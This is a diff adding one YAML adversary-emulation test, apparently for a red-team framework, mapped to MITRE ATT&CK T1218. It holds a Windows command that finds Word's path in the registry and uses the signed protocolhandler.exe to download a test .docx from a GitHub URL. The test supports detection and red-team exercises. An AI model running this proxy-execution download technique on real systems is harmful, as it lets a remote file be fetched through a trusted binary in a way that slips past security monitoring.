@@ -1,0 +1,20 @@
+---
+- id: 2c276ef775e39925256bff68ce6ba19f
+  name: ProtocolHandler.exe Downloaded a Suspicious File
+  description: 'Emulates attack via documents through protocol handler in Microsoft
+    Office.  On successful execution you should see Microsoft Word launch a blank
+    file.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App
+          Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b && call "%microsoft_wordpath%\protocolhandler.exe"
+          "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
+        payloads: []
+        cleanup: ''
